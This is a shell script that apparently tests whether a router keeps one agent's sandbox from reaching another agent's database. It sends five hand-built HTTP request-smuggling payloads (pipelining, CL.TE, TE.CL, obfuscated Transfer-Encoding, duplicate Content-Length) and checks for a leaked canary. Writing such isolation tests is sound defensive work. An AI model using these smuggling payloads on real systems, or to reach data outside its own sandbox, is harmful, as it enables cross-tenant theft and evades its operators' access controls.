#!/bin/sh
# Run inside sandbox A, with /usr/bin/openssl added to the router rule's binaries: raw HTTP/1.1
# framing on one TLS connection where the supervisor injects A's credential. Each case tries to
# get a request for B's database past the path rules; B's canary is `b-private-plan`.
#
#   sh http-layer.sh <router-ip>
set -u
R="$1"
A_BODY='{"requests":[{"type":"execute","stmt":{"sql":"SELECT 1"}},{"type":"close"}]}'
B_BODY='{"requests":[{"type":"execute","stmt":{"sql":"SELECT * FROM secrets"}},{"type":"close"}]}'
hdr() { # path content-length extra-header
  printf 'POST %s HTTP/1.1\r\nHost: %s:8443\r\nAuthorization: Bearer %s\r\nContent-Type: application/json\r\n%bContent-Length: %s\r\n\r\n' \
    "$1" "$R" "$FLEETRING_TOKEN" "$3" "$2"
}
send() { # name, then the raw request on stdin
  printf '\n### %s\n' "$1"
  timeout 8 openssl s_client -quiet -connect "$R:8443" 2>/tmp/s.err > /tmp/s.out
  echo "[openssl exit $?]"
  grep -E '^HTTP/|"error"|"code"|policy|b-private-plan' /tmp/s.out | head -12
  grep -q b-private-plan /tmp/s.out && echo "B'S CANARY LEAKED" || echo "no canary in the responses"
  grep -v -E '^depth|^verify' /tmp/s.err | head -3
}

B_REQ=$(hdr /db/agent-b-memory/v3/pipeline ${#B_BODY} ""; printf '%s' "$B_BODY")

{ hdr /db/agent-a-memory/v3/pipeline ${#A_BODY} ""; printf '%s' "$A_BODY"; printf '%s' "$B_REQ"; } \
  | send "7.1 keep-alive: A's request, then B's on the same connection"

SMUGGLED=$(printf '0\r\n\r\n%s' "$B_REQ")
{ hdr /db/agent-a-memory/v3/pipeline ${#SMUGGLED} "Transfer-Encoding: chunked\r\n"; printf '%s' "$SMUGGLED"; } \
  | send "7.2 CL.TE: Content-Length covers a smuggled request for B; chunked ends the body first"

CHUNK=$(printf '%x\r\n%s\r\n0\r\n\r\n' ${#A_BODY} "$A_BODY")
{ hdr /db/agent-a-memory/v3/pipeline 4 "Transfer-Encoding: chunked\r\n"; printf '%s' "$CHUNK"; printf '%s' "$B_REQ"; } \
  | send "7.3 TE.CL: chunked body, a short Content-Length, B's request after it"

{ hdr /db/agent-a-memory/v3/pipeline ${#SMUGGLED} "Transfer-Encoding: xchunked\r\n"; printf '%s' "$SMUGGLED"; } \
  | send "7.4 obfuscated Transfer-Encoding"

{ printf 'POST /db/agent-a-memory/v3/pipeline HTTP/1.1\r\nHost: %s:8443\r\nAuthorization: Bearer %s\r\nContent-Type: application/json\r\nContent-Length: %s\r\nContent-Length: 0\r\n\r\n%s' \
    "$R" "$FLEETRING_TOKEN" ${#A_BODY} "$A_BODY"; printf '%s' "$B_REQ"; } \
  | send "7.5 two Content-Length headers"
